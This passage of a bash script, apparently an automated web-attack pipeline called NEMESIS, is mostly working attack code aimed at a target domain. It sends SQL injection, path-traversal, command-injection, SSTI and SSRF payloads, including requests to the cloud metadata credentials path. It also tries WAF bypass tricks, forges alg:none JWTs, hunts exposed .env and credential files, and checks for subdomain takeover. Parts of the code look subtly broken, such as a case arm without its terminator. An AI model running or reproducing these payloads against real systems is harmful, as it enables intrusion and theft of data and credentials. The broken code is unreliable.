    local tpl; tpl="${kind#NUCLEI:}"
    case "$tpl" in
      *sqli*|*sql-injection*)      q() { :; }; ;;
      *lfi*|*path-traversal*|*traversal*) ;;
      *ssrf*) ;;
      *rce*|*command-injection*|*cmd-injection*) ;;
      *ssti*|*template-injection*) ;;
      *xss*) ;;
      *idor*|*insecure-direct*) ;;
      *open-redirect*) ;;
      *takeover*) ;;
    esac
  done < "$W/vulns/nuclei/parsed.txt" 2>/dev/null || true
  log OK "nuclei parsed: $(cnt "$W/vulns/nuclei/parsed.txt")"
}
NEMESIS_EOF
echo "PART 3 of 6 appended — $(wc -l < /usr/local/bin/bug) lines so far"
cat >> /usr/local/bin/bug <<'NEMESIS_EOF'

# ─────────────────────────── STAGE: WAF ───────────────────────────
stage_waf() {
  step "WAF — detect + enumerate bypass vectors"
  mkdir -p "$W/vulns/waf"
  local host; host=$(head -1 "$W/subs/live.txt" 2>/dev/null); [[ -z "$host" ]] && return
  if has wafw00f; then wafw00f "$host" -a -o "$W/vulns/waf/detect.txt" 2>/dev/null || true; fi
  local waf; waf=$(grep -iE "waf|firewall|protection" "$W/vulns/waf/detect.txt" 2>/dev/null | grep -viE "no waf|not detected" | head -1 || true)
  if [[ -n "$waf" ]]; then
    log H "WAF present: ${waf:0:80}"
    local P=("id" "select" "<script>" "/etc/passwd" "{{7*7}}" "' OR 1=1--")
    for p in "${P[@]}"; do
      local ue; ue="${host}/?q=$(echo "$p" | sed 's/ /%20/g')"
      probe "$ue"
      if [[ "$RC" =~ ^(403|406|429|418|500)$ || "$RC" == "000" ]]; then
        echo "BLOCKED|$p|${RC}" >> "$W/vulns/waf/blocked_payloads.txt"
      fi
    done
    echo "BYPASS_HINTS" >> "$W/vulns/waf/notes.txt"
    cat >> "$W/vulns/waf/notes.txt" <<'WAFN'
# Encoding bypass ladder:
# 1. URL encode once/twice  2. mixed case 3. null byte %00  4. tab/newline (\t, %09, %0a)
# 5. unicode (%u0027, %efbc87)  6. chunked TE  7. param pollution (?id=1&id=2)
# 8. JSON/XML content-type switch  9. comment obfuscation 10. HTTP/1.0 vs 1.1
WAFN
    u "$W/vulns/waf/blocked_payloads.txt"
  else log OK "no WAF detected"
  fi
}

# ─────────────────────────── STAGE: WEB (FINGERPRINT + XSS + SQLI + LFI + SSRF + CMDI + SSTI) ───────────────────────────
stage_web() {
  step "WEB — fingerprint · injection auto-detect → verify"
  local O="$W/vulns/web"; mkdir -p "$O"
  # fingerprint (tech) for SSTI/JWT targets
  local host; host=$(head -1 "$W/subs/live.txt" 2>/dev/null)
  if [[ -n "$host" ]]; then
    probe "$host"
    echo "$RB" | grep -oiE "generator[^>]*|x-powered-by[^>]*|server: [^<]*" >> "$O/banner.txt" 2>/dev/null || true
    curlx -D - -o /dev/null -- "$host" 2>/dev/null | grep -iE "^(server|x-powered-by|x-generator|via):" >> "$O/banner.txt" || true
  fi
  if has whatweb; then whatweb -a 3 "$host" --log-json="$W/subs/whatweb.json" >/dev/null 2>&1 || true; fi
  # XSS via dalfox
  if has dalfox && [[ -s "$W/urls/params.txt" ]]; then
    log I "dalfox reflected-XSS…"
    timeout 900 dalfox file "$W/urls/params.txt" --no-spinner --skip-bav -b "${COLLECTOR:-}" \
      -o "$O/dalfox_raw.txt" ${COOKIE:+--cookie "$COOKIE"} >/dev/null 2>&1 || true
    grep -oE '^https?://[^ ]+' "$O/dalfox_raw.txt" 2>/dev/null | sort -u | head -15 | while IFS= read -r ux; do
      local pl; pl=$(grep -A1 "$ux" "$O/dalfox_raw.txt" 2>/dev/null | grep -oE '<[^>]{5,120}>' | head -1 || true)
      echo "HIGH|XSS|${pl:-dalfox_verified}|$ux" >> "$O/reflected_xss.txt"
      qadd high xss "${pl:-dalfox_verified}|$ux"
    done
  fi
  # SQLi via manual probes on param URLs
  if [[ -s "$W/urls/params.txt" ]]; then
    head -60 "$W/urls/params.txt" | while IFS= read -r u; do
      local base; base=$(echo "$u" | grep -oP '^https?://[^/]+')
      for pm in "'" '"' "')" "';" "%27"; do
        local t; t=$(echo "$u" | qsreplace "$pm" 2>/dev/null)
        probe "$t"
        if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "sql (syntax|error)|mysql|postgres|sqlite|ora-[0-9]+|microsoft.*odbc|unclosed quotation"; then
          echo "HIGH|SQLI|${pm}|$t" >> "$O/sqli_probes.txt"
          qadd high sqli "$t"
          break
        fi
      done
      for s in "sleep(3)" "pg_sleep(3)" "WAITFOR DELAY '0:0:3'" "benchmark(10000000,md5(1))"; do
        local t2; t2=$(echo "$u" | qsreplace "$s" 2>/dev/null)
        local t0; t0=$(date +%s%N)
        local code; code=$(curlx -o /dev/null -w '%{http_code}' -- "$t2" 2>/dev/null || echo 000)
        local t1; t1=$(date +%s%N)
        local ms; ms=$(( (t1-t0)/1000000 ))
        if [[ "$code" =~ ^(200|302)$ && "$ms" -gt 2800 ]]; then
          echo "HIGH|SQLI-TIME|${ms}ms|$t2" >> "$O/sqli_time.txt"
          qadd high sqli "$t2"
          break
        fi
      done
    done
  fi
  u "$O/sqli_probes.txt" "$O/sqli_time.txt" "$O/reflected_xss.txt"
  log OK "XSS: $(cnt "$O/reflected_xss.txt") | SQLi: $(cnt "$O/sqli_probes.txt")+$(cnt "$O/sqli_time.txt")"
}

# ─────────────────────────── STAGE: AUTHZ ───────────────────────────
stage_authz() {
  step "AUTHZ — admin/panel discovery + JWT hunting"
  local O="$W/vulns/authz"; mkdir -p "$O"
  local PANELS=("admin" "admin/login" "administrator" "wp-admin" "login" "signin" "auth/login" "api/v1/admin" "console" "dashboard" "cpanel" "manager")
  while IFS= read -r base; do
    for p in "${PANELS[@]}"; do
      probe "${base%/}/${p}"
      if [[ "$RC" =~ ^(200|302)$ ]]; then
        soft404 "${base%/}/${p}" "$RB" && continue
        echo "LOGIN_PANEL|${RC}|${base%/}/${p}" >> "$O/panels.txt"
        log H "Login/admin (verified): ${base%/}/${p} [${RC}]"
      fi
    done
  done < <(head -10 "$W/subs/live.txt" 2>/dev/null)
  # JWT hunt
  grep -rhoE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' "$W" --include='*.txt' --include='*.json' 2>/dev/null | sort -u > "$W/js/jwts.txt" || true
  u "$W/js/jwts.txt" "$O/panels.txt"
  [[ -s "$W/js/jwts.txt" ]] && log H "JWT tokens found: $(cnt "$W/js/jwts.txt") → queued for crack/forge"
  log OK "panels: $(cnt "$O/panels.txt") | jwt: $(cnt "$W/js/jwts.txt")"
}

# ─────────────────────────── STAGE: CLOUD ───────────────────────────
stage_cloud() {
  step "CLOUD — sensitive exposure · buckets · tech paths"
  local O="$W/vulns/cloud"; mkdir -p "$O"
  local META_FILES=("/.git/config" "/.env" "/.env.production" "/.env.local" "/config.json" "/config.php" "/config.yml" "/.htaccess" "/.svn/entries" "/.DS_Store" "/debug" "/actuator" "/actuator/env" "/actuator/heapdump" "/swagger-ui.html" "/server-status" "/phpinfo.php" "/wp-config.php.bak" "/backup.zip" "/db.sql" "/dump.sql" "/.ftpconfig" "/.aws/credentials" "/.dockerenv" "/Dockerfile" "/docker-compose.yml" "/Procfile" "/robots.txt")
  while IFS= read -r base; do
    for p in "${META_FILES[@]}"; do
      probe "${base}${p}"
      if [[ "$RC" == "200" && "$RL" -gt 10 ]]; then
        soft404 "${base}${p}" "$RB" && continue
        local hit=""
        case "$p" in
          *.git/*)        echo "$RB" | grep -q "repositoryformatversion" && hit="GIT_EXPOSED|${base}${p}" ;;
          *.env*)         echo "$RB" | grep -qE "=|KEY|SECRET|TOKEN|PASSWORD|DB_" && hit="ENV_EXPOSED|${base}${p}" ;;
          *actuator*)     echo "$RB" | grep -qiE "spring|beans|env|health|mappings" && hit="ACTUATOR|${base}${p}" ;;
          *phpinfo*)      echo "$RB" | grep -qi "php version" && hit="PHPINFO|${base}${p}" ;;
          *swagger*)      echo "$RB" | grep -qiE "swagger|openapi" && hit="SWAGGER|${base}${p}" ;;
          *)              hit="EXPOSED_FILE|${base}${p}|${RL}b" ;;
        esac
        [[ -n "$hit" ]] && { echo "$hit" >> "$O/sensitive.txt"; log H "$hit"; }
      fi
    done
  done < <(head -8 "$W/subs/live.txt" 2>/dev/null)
  # buckets
  for n in "$DOMAIN" "${DOMAIN//./-}" "backup.$DOMAIN" "uploads.$DOMAIN" "assets.$DOMAIN" "media.$DOMAIN" "static.$DOMAIN"; do
    probe "https://$n.s3.amazonaws.com/?list-type=2&max-keys=3"
    echo "$RB" | grep -q "ListBucketResult" && { echo "S3_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public S3 (verified): $n"; }
    probe "https://storage.googleapis.com/$n?prefix="
    echo "$RB" | grep -q "ListBucketResult" && { echo "GCS_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public GCS (verified): $n"; }
    probe "https://$n.blob.core.windows.net/?comp=list"
    echo "$RB" | grep -q "EnumerationResults" && { echo "AZURE_PUBLIC|$n" >> "$O/buckets.txt"; log H "Public Azure blob (verified): $n"; }
  done
  u "$O/sensitive.txt" "$O/buckets.txt"
  log OK "sensitive: $(cnt "$O/sensitive.txt") | buckets: $(cnt "$O/buckets.txt")"
}

# ─────────────────────────── STAGE: API ───────────────────────────
stage_api() {
  step "API — swagger · graphql · undocumented"
  local O="$W/api"; mkdir -p "$O"
  local AP=("/swagger" "/swagger-ui.html" "/swagger/index.html" "/v2/api-docs" "/v3/api-docs" "/openapi.json" "/api/openapi.json" "/api/docs" "/docs" "/redoc" "/api/swagger.json")
  local GQ=("/graphql" "/graphiql" "/api/graphql" "/v1/graphql" "/gql" "/query")
  while IFS= read -r base; do
    for p in "${AP[@]}"; do
      probe "${base}${p}"
      [[ "$RC" == "200" ]] && echo "$RB" | grep -qiE "(swagger|openapi|api-docs|\"paths\")" && {
        echo "${base}${p}" >> "$O/specs.txt"; log H "API spec (verified): ${base}${p}"; }
    done
    for p in "${GQ[@]}"; do
      local g; g=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __typename }"}' -- "${base}${p}" 2>/dev/null | head -c 1500 || true)
      if echo "$g" | grep -qiE "(__typename|\"errors\")"; then
        echo "${base}${p}" >> "$O/graphql.txt"; log H "GraphQL (verified): ${base}${p}"
        local gi; gi=$(curlx -X POST -H "Content-Type: application/json" -d '{"query":"{ __schema { types { name } } }"}' -- "${base}${p}" 2>/dev/null | head -c 800 || true)
        echo "$gi" | grep -q "__schema" && { echo "${base}${p}" >> "$O/graphql_introspection.txt"; log H "introspection OPEN: ${base}${p}"; }
      fi
    done
  done < <(head -6 "$W/subs/live.txt" 2>/dev/null)
  for b in /api /api/v1 /api/v2 /api/v3 /rest /backend /internal; do
    probe "https://$DOMAIN${b}"
    [[ "$RC" =~ ^(200|201|401|403)$ ]] && { soft404 "https://$DOMAIN${b}" "$RB" || echo "API_BASE[${RC}]|${b}" >> "$O/bases.txt"; }
  done
  u "$O/specs.txt" "$O/graphql.txt" "$O/graphql_introspection.txt" "$O/bases.txt"
  log OK "specs: $(cnt "$O/specs.txt") | graphql: $(cnt "$O/graphql.txt") | introspection: $(cnt "$O/graphql_introspection.txt")"
}
NEMESIS_EOF
echo "PART 4 of 6 appended — $(wc -l < /usr/local/bin/bug) lines so far"
cat >> /usr/local/bin/bug <<'NEMESIS_EOF'

# ─────────────────────────── STAGE: PARAM FUZZ ───────────────────────────
stage_param_fuzz() {
  step "PARAM FUZZ — hidden params + type confusion + JSON mutation"
  local O="$W/vulns/param_fuzz"; mkdir -p "$O"
  local PW="/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt"
  [[ ! -f "$PW" ]] && PW="/usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt"
  [[ ! -f "$PW" ]] && PW="/usr/share/wordlists/dirb/common.txt"
  if has ffuf && [[ -s "$W/urls/params.txt" ]]; then
    head -10 "$W/urls/params.txt" | while IFS= read -r u; do
      local b s; b="${u%%\?*}"; s=$(sn "$u")
      ffuf -u "${b}?FUZZ=nemesis_probe" -w "$PW" -t 40 -mc 200,201,302 -ac -s \
        -of json -o "$O/ffuf_${s}.json" 2>/dev/null || true
    done
    find "$O" -name 'ffuf_*.json' -size +10c | xargs -r jq -r '.results[]?.input.FUZZ' {} 2>/dev/null | sort -u > "$O/hidden_params.txt" || true
  fi
  local TM=("0" "-1" "999999999999" "null" "undefined" "true" "false" "[]" "{}" "NaN" "Infinity" "%00")
  if [[ -s "$W/urls/params.txt" ]]; then
    head -25 "$W/urls/params.txt" | while IFS= read -r u; do
      for m in "${TM[@]}"; do
        local t; t=$(echo "$u" | qsreplace "$m" 2>/dev/null)
        probe "$t"
        if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "(stack trace|typeerror|valueerror|null pointer|parse error|invalid.*type|expected.*(number|integer))"; then
          echo "MEDIUM|TYPE_CONFUSION|($m) $t" >> "$O/type_confusion.txt"
        fi
      done
    done
  fi
  local JP=('{"__proto__":{"admin":true}}' '{"$gt":"","$ne":""}' '{"role":"admin","is_admin":true,"privilege":9999}')
  local JL=("prototype_pollution" "nosql_injection" "mass_assignment")
  if [[ -s "$W/urls/params.txt" ]]; then
    head -15 "$W/urls/params.txt" | while IFS= read -r u; do
      for i in "${!JP[@]}"; do
        local b c; b=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -- "$u" 2>/dev/null | head -c 1200 || true)
        c=$(curlx -X POST -H "Content-Type: application/json" -d "${JP[$i]}" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
        if [[ "$c" =~ ^(200|201)$ ]] || echo "$b" | grep -qiE "(admin|success|token|privilege|elevated)"; then
          echo "MEDIUM|JSON_MUTATION|${JL[$i]} [${c}] $u" >> "$O/json_hits.txt"
          log H "JSON mutation (verified): ${JL[$i]} @ $u"
        fi
      done
    done
  fi
  u "$O/hidden_params.txt" "$O/type_confusion.txt" "$O/json_hits.txt"
  log OK "hidden params: $(cnt "$O/hidden_params.txt") | type confusion: $(cnt "$O/type_confusion.txt") | json: $(cnt "$O/json_hits.txt")"
}

# ─────────────────────────── STAGE: CALIBRATE / SOFT404 ───────────────────────────
CAL_A=""; CAL_B=""
calibrate() {
  local base=$1
  local ra rb
  probe "${base}/__nemesis_cal_$(date +%s%N)_a"; ra="$RB"
  probe "${base}/__nemesis_cal_$(date +%s%N)_b"; rb="$RB"
  CAL_A=$(sn "$ra"); CAL_B=$(sn "$rb")
  [[ -n "$CAL_A" && "$CAL_A" == "$CAL_B" ]] && CAL_B="same-as-a"
}
soft404() {
  local u=$1 body=$2
  [[ "$CAL_A" == "same-as-a" ]] && return 0
  local s; s=$(sn "$body")
  [[ "$s" == "$CAL_A" || "$s" == "$CAL_B" ]] && return 0
  return 1
}
stage_calibrate() {
  step "CALIBRATE — soft-404 baseline per host"
  while IFS= read -r base; do calibrate "$base"; done < <(head -4 "$W/subs/live.txt" 2>/dev/null)
  log OK "baseline: ${CAL_A:-n/a}"
}

# ─────────────────────────── AUTHZ MODULES (VERIFY → QUEUE) ───────────────────────────
mod_csrf_cors_redirect() {
  step "AUTHZ — CSRF · CORS · open redirect (all verified)"
  local O="$W/vulns/authz"; mkdir -p "$O"
  # CSRF: POST endpoints without token check
  if [[ -s "$W/urls/params.txt" ]]; then
    grep -E '\.(php|asp|aspx|jsp)([?#]|$)' "$W/urls/params.txt" | head -20 | while IFS= read -r u; do
      local hdr; hdr=$(curlx -X POST -H "Origin: https://evil.example" -D - -o /dev/null -- "$u" 2>/dev/null || true)
      echo "$hdr" | grep -qiE "set-cookie:.*(csrf|xsrf|token)" && continue
      local c; c=$(curlx -X POST -d "x=1" -o /dev/null -w '%{http_code}' -- "$u" 2>/dev/null || echo 000)
      [[ "$c" =~ ^(200|201|204|302)$ ]] && { echo "MEDIUM|CSRF-NO-TOKEN|${c} $u" >> "$O/csrf.txt"; qadd medium csrf "$u"; }
    done
  fi
  # CORS: reflected origin + credentials
  if [[ -s "$W/urls/params.txt" ]]; then
    head -20 "$W/urls/params.txt" | while IFS= read -r u; do
      local hd; hd=$(curlx -H "Origin: https://evil.example" -D - -o /dev/null -- "$u" 2>/dev/null || true)
      if echo "$hd" | grep -qi "Access-Control-Allow-Origin: https://evil.example"; then
        local cr; cr=$(echo "$hd" | grep -i "Access-Control-Allow-Credentials" | grep -qi true && echo yes || echo no)
        local sev=medium; [[ "$cr" == "yes" ]] && sev=high
        echo "${sev^^}|CORS-REFLECT|credentials:${cr} $u" >> "$O/cors.txt"
        qadd "$sev" cors "$u"
      fi
    done
  fi
  # Open redirect
  if [[ -s "$W/urls/params.txt" ]]; then
    head -20 "$W/urls/params.txt" | while IFS= read -r u; do
      local t loc; t=$(echo "$u" | qsreplace "https://evil.example" 2>/dev/null)
      loc=$(curlx -s -o /dev/null -w '%{redirect_url}' -- "$t" 2>/dev/null || true)
      [[ "$loc" == https://evil.example* ]] && { echo "HIGH|OPEN-REDIRECT|$t → $loc" >> "$O/redirect.txt"; qadd high redirect "$t"; }
    done
  fi
  u "$O/csrf.txt" "$O/cors.txt" "$O/redirect.txt"
  log OK "csrf: $(cnt "$O/csrf.txt") | cors: $(cnt "$O/cors.txt") | redirect: $(cnt "$O/redirect.txt")"
}

mod_sqli_verify() {
  step "SQLI — auto-detect → verify → queue"
  local O="$W/vulns/web"; mkdir -p "$O"
  [[ -s "$W/urls/params.txt" ]] || { log I "no param URLs — skip"; return; }
  head -80 "$W/urls/params.txt" | while IFS= read -r u; do
    local t; t=$(echo "$u" | qsreplace "'" 2>/dev/null)
    probe "$t"
    if [[ "$RC" == "500" ]] || echo "$RB" | grep -qiE "sql (syntax|error)|unclosed quotation|mysql_|postgres|sqlite|ora-[0-9]+|odbc"; then
      # verify: boolean true vs false
      local bt bf
      bt=$(curlx -- "$(echo "$u" | qsreplace "' AND '1'='1" 2>/dev/null)" 2>/dev/null | head -c 4000 || true)
      bf=$(curlx -- "$(echo "$u" | qsreplace "' AND '1'='2" 2>/dev/null)" 2>/dev/null | head -c 4000 || true)
      local tb; tb=$(sn "$bt"); local fb; fb=$(sn "$bf")
      local rb1; rb1=$(echo "$bt" | head -c 2000 | md5sum | cut -c1-12)
      local rb2; rb2=$(echo "$bf" | head -c 2000 | md5sum | cut -c1-12)
      if [[ "$rb1" != "$rb2" ]]; then
        echo "CRITICAL|SQLI-BOOLEAN-VERIFIED|$t" >> "$O/sqli_verified.txt"
        qadd critical sqli "$t"
        log H "SQLi VERIFIED (boolean): $t"
      else
        # time-based check
        local t0 t1 ms; t0=$(date +%s%N)
        curlx -o /dev/null -- "$(echo "$u" | qsreplace "IF(1=1,SLEEP(3),0)" 2>/dev/null)" 2>/dev/null || true
        t1=$(date +%s%N); ms=$(( (t1-t0)/1000000 ))
        [[ "$ms" -gt 2500 ]] && { echo "CRITICAL|SQLI-TIME-VERIFIED|${ms}ms $t" >> "$O/sqli_verified.txt"; qadd critical sqli "$t"; log H "SQLi VERIFIED (time ${ms}ms): $t"; }
      fi
    fi
  done
  u "$O/sqli_verified.txt"
  log OK "SQLi verified: $(cnt "$O/sqli_verified.txt")"
}

mod_lfi_ssrf_cmdi_ssti() {
  step "LFI · SSRF · CMDi · SSTI — detect → verify → queue"
  local O="$W/vulns/web"; mkdir -p "$O"
  [[ -s "$W/urls/params.txt" ]] || { log I "no param URLs — skip"; return; }
  local LFI_P=("../../../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2f%2e%2e%2fetc%2fpasswd" "..%2f..%2f..%2f..%2fetc%2fpasswd")
  local SSRF_P=("http://169.254.169.254/latest/meta-data/" "http://127.0.0.1:80/" "http://localhost/" "http://[::1]/" "http://169.254.169.254/latest/meta-data/iam/security-credentials/")
  local CMD_P=(";id" "|id" "`id`" "$(id)" "&&id" "|whoami")
  local SSTI_P=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '{{7*'7'}}' '#{7*7}')
  local FILE_SIG="root:x:0:0:"
  local DELAY=3
  head -40 "$W/urls/params.txt" | while IFS= read -r u; do
    # LFI
    for p in "${LFI_P[@]}"; do
      local t b; t=$(echo "$u" | qsreplace "$p" 2>/dev/null)
      b=$(curlx -- "$t" 2>/dev/null | head -c 3000 || true)
      if echo "$b" | grep -q "$FILE_SIG"; then
        echo "CRITICAL|LFI-VERIFIED|$t" >> "$O/lfi_verified.txt"
        qadd critical lfi "$t"
        log H "LFI VERIFIED: $t"
        break
      fi
    done
    # SSRF (meta + probe via unique marker)
    for p in "${SSRF_P[@]}"; do
      local t2 b2; t2=$(echo "$u" | qsreplace "$p" 2>/dev/null)
      b2=$(curlx -L -- "$t2" 2>/dev/null | head -c 3000 || true)
      if echo "$b2" | grep -qiE "(ami-id|instance-id|security-credentials|meta-data|computeMetadata)"; then
        echo "CRITICAL|SSRF-METADATA-VERIFIED|$t2" >> "$O/ssrf_verified.txt"
        qadd critical ssrf "$t2"
        log H "SSRF → cloud metadata VERIFIED: $t2"
        break
      fi
    done
    # CMDi
    for p in "${CMD_P[@]}"; do
      local t3 b3; t3=$(echo "$u" | qsreplace "$p" 2>/dev/null)
      b3=$(curlx -- "$t3" 2>/dev/null | head -c 2000 || true)
      if echo "$b3" | grep -qE "uid=[0-9]+\(|root:x:0:0:|GNU coreutils"; then
        echo "CRITICAL|CMDi-VERIFIED|$t3" >> "$O/cmdi_verified.txt"
        qadd critical cmdi "$t3"
        log H "CMDi VERIFIED: $t3"
        break
      fi
    done
    # SSTI
    for p in "${SSTI_P[@]}"; do
      local t4 b4; t4=$(echo "$u" | qsreplace "$p" 2>/dev/null)
      b4=$(curlx -- "$t4" 2>/dev/null || true)
      if echo "$b4" | grep -q "49"; then
        local eng="Jinja2"; echo "$b4" | grep -q "{{" && eng="Jinja2/Twig"
        echo "CRITICAL|SSTI-VERIFIED|${eng}|$t4" >> "$O/ssti_verified.txt"
        qadd critical ssti "${eng}|$t4"
        log H "SSTI VERIFIED ($eng): $t4"
        break
      fi
    done
  done
  u "$O/lfi_verified.txt" "$O/ssrf_verified.txt" "$O/cmdi_verified.txt" "$O/ssti_verified.txt"
  log OK "LFI: $(cnt "$O/lfi_verified.txt") | SSRF: $(cnt "$O/ssrf_verified.txt") | CMDi: $(cnt "$O/cmdi_verified.txt") | SSTI: $(cnt "$O/ssti_verified.txt")"
}

mod_idor_bac() {
  step "IDOR · BAC — param heuristics → verified"
  local O="$W/vulns/web"; mkdir -p "$O"
  [[ -s "$W/urls/params.txt" ]] || { log I "no param URLs — skip"; return; }
  grep -E '[?&](id|uid|user_id|account|acct|profile|file_id|doc_id|order|order_id|invoice|ref|code)=[0-9]+' "$W/urls/params.txt" | head -15 | while IFS= read -r u; do
    local id; id=$(echo "$u" | grep -oE '(id|uid|user_id|account|acct|profile|file_id|doc_id|order|order_id|invoice|ref|code)=[0-9]+' | head -1)
    local pn pv; pn="${id%%=*}"; pv="${id#*=}"
    local t; t=$(echo "$u" | sed "s/${pn}=${pv}/${pn}=$((pv+1))/")
    local b1 b2; b1=$(curlx -- "$u" 2>/dev/null | head -c 2000 || true); b2=$(curlx -- "$t" 2>/dev/null | head -c 2000 || true)
    if [[ "$(echo "$b1" | md5sum | cut -c1-12)" != "$(echo "$b2" | md5sum | cut -c1-12)" ]]; then
      if echo "$b2" | grep -qiE "email|password|token|address|phone|ssn|invoice"; then
        echo "HIGH|IDOR-CANDIDATE|$u vs $t" >> "$O/idor.txt"
        qadd high idor "$u"
        log H "IDOR candidate (2-account verify needed): $t"
      fi
    fi
  done
  head -10 "$W/subs/live.txt" | while IFS= read -r base; do
    for p in "admin" "admin/" "api/admin" "internal" "staff" "manage"; do
      local a1 a2; a1=$(curlx -o /dev/null -w '%{http_code}' -- "${base%/}/${p}" 2>/dev/null || echo 000)
      a2=$(curlx -o /dev/null -w '%{http_code}' -H "X-Forwarded-For: 127.0.0.1" -H "X-Original-URL: /${p}" -- "${base%/}/${p}" 2>/dev/null || echo 000)
      if [[ "$a2" =~ ^(200|302)$ && ! "$a1" =~ ^(200|302)$ ]]; then
        echo "HIGH|BAC-BYPASS|$base/$p (403→${a2})" >> "$O/bac.txt"
        qadd high bac "${base%/}/${p}"
        log H "BAC bypass via header: ${base%/}/${p} → ${a2}"
      fi
    done
  done
  u "$O/idor.txt" "$O/bac.txt"
  log OK "idor candidates: $(cnt "$O/idor.txt") | bac: $(cnt "$O/bac.txt")"
}

mod_jwt_verify() {
  step "JWT — decode · alg-none · crack queue"
  local O="$W/js"; mkdir -p "$O"
  [[ -s "$W/js/jwts.txt" ]] || return
  while IFS= read -r jwt; do
    local hdr; hdr=$(echo "$jwt" | cut -d. -f1 | base64 -d 2>/dev/null || true)
    echo "$hdr" | grep -qi '"alg"[[:space:]]*:[[:space:]]*"none"' && { echo "CRITICAL|JWT-ALG-NONE|$jwt" >> "$W/vulns/authz/jwt.txt"; qadd critical jwt "$jwt"; log H "JWT alg:none — forgeable: ${jwt:0:40}…"; }
    [[ -s "$HOME/tools/jwt_tool/jwt_tool.py" ]] && echo "$jwt" >> "$O/jwt_crack_queue.txt"
  done < "$W/js/jwts.txt"
  u "$O/jwt_crack_queue.txt"
}

mod_takeover() {
  step "TAKEOVER — dangling DNS/CNAME → claimable"
  local O="$W/vulns/authz"; mkdir -p "$O"
  local seen=""
  while IFS= read -r sub; do
    local cname; cname=$(dig +short CNAME "$sub" 2>/dev/null | head -1 || true)
    [[ -z "$cname" ]] && continue
    local svc=""
    case "$cname" in
      *.github.io) svc="github" ;; *.herokuapp.com) svc="heroku" ;; *.azurewebsites.net) svc="azure"
      *.cloudfront.net) svc="cloudfront" ;; *.s3.amazonaws.com) svc="s3" ;; *.cname.vercel-dns.com) svc="vercel"
      *.netlify.app) svc="netlify" ;; *.pantheonsite.io) svc="pantheon" ;; *.fastly.net) svc="fastly"
      *.shopify.com) svc="shopify" ;; *) svc="other" ;;
    esac
    [[ "$svc" == "other" ]] && continue
    probe "http://$sub"
    case "$svc" in
      github)   echo "$RB" | grep -qi "There isn't a GitHub Pages site here" && seen="$sub" ;;
      heroku)   echo "$RB" | grep -qi "No such app" && seen="$sub" ;;
      azure)    echo "$RB" | grep -qiE "404 Web Site not found|NoSuchWebsite" && seen="$sub" ;;
      s3)       echo "$RB" | grep -qi "NoSuchBucket" && seen="$sub" ;;
      vercel)   echo "$RB" | grep -qi "NOT_FOUND" && seen="$sub" ;;
      netlify)  echo "$RB" | grep -qi "Not Found" && seen="$sub" ;;
      fastly)   echo "$RB" | grep -qi "Fastly error" && seen="$sub" ;;
      shopify)  echo "$RB" | grep -qi "Only one step left" && seen="$sub" ;;
    esac
    if [[ -n "$seen" ]]; then
      echo "HIGH|TAKEOVER-${svc^^}|$sub (CNAME $cname)" >> "$O/takeover.txt"
      qadd high takeover "$sub"
      log H "SUBDOMAIN TAKEOVER (${svc}): $sub"
      seen=""
    fi
  done < "$W/subs/all.txt"
  u "$O/takeover.txt"
  log OK "takeover verified: $(cnt "$O/takeover.txt")"
}
NEMESIS_EOF
echo "PART 5 of 6 appended — $(wc -l < /usr/local/bin/bug) lines so far"
cat >> /usr/local/bin/bug <<'NEMESIS_EOF'

# ─────────────────────────── MAIN PIPELINE ───────────────────────────
run_pipeline() {
  mkdir -p "$W"/{subs,urls,js,js/paths,js/raw,vulns,vulns/web,vulns/authz,vulns/cloud,vulns/fuzz,vulns/nuclei,vulns/param_fuzz,api,exploits,reports,screenshots}
  echo "NEMESIS v$VERSION — $DOMAIN — $(date)" > "$LOG"
  step "01 RECON — subdomain enumeration"
  : > "$W/subs/all.txt"
  if has subfinder; then subfinder -d "$DOMAIN" -silent ${COOKIE:+--cookie "$COOKIE"} 2>/dev/null >> "$W/subs/all.txt" || true; fi
  if has amass; then timeout 300 amass enum -passive -d "$DOMAIN" 2>/dev/null >> "$W/subs/all.txt" || true; fi
  if has assetfinder; then assetfinder --subs-only "$DOMAIN" 2>/dev/null >> "$W/subs/all.txt" || true; fi
  echo "$DOMAIN" >> "$W/subs/all.txt"
  [[ -f "$SCOPE_FILE" ]] && cat "$SCOPE_FILE" >> "$W/subs/all.txt"
  u "$W/subs/all.txt"
  log OK "subdomains: $(cnt "$W/subs/all.txt")"

  step "02 RESOLVE — httpx alive + status"
  if has httpx; then
    httpx -l "$W/subs/all.txt" -silent -status-code -title -tech-detect -follow-redirects \
      -timeout "$T_HTTPX" -threads 50 -o "$W/subs/live.txt" 2>/dev/null || true
    awk '{print $1}' "$W/subs/live.txt" | sort -u > "$W/subs/live_hosts.txt"
    grep "\[200\]" "$W/subs/live.txt" | awk '{print $1}' | sort -u > "$W/subs/status_200.txt"
    grep -oE '\[[0-9]{3}\]' "$W/subs/live.txt" | tr -d '[]' | sort | uniq -c | sort -rn | head -5 >> "$LOG"
  else
    log W "httpx missing — using curl fallback"
    while IFS= read -r sub; do
      for proto in https http; do
        probe "${proto}://${sub}"
        [[ "$RC" =~ ^(200|301|302|401|403)$ ]] && { echo "${proto}://${sub} [${RC}]" >> "$W/subs/live.txt"; break; }
      done
    done < "$W/subs/all.txt"
  fi
  u "$W/subs/live.txt"; u "$W/subs/status_200.txt"
  log OK "alive: $(cnt "$W/subs/live.txt")"

  stage_urls
  stage_js_paths
  stage_fuzz
  stage_nuclei
  stage_waf
  stage_calibrate

  step "WEB — fingerprints + verified injection hunting"
  stage_web
  mod_sqli_verify
  mod_lfi_ssrf_cmdi_ssti
  mod_idor_bac
  mod_csrf_cors_redirect
  mod_jwt_verify
  mod_takeover

  stage_cloud
  stage_api
  stage_param_fuzz

  if has gowitness; then
    step "SCREENSHOTS — gowitness"
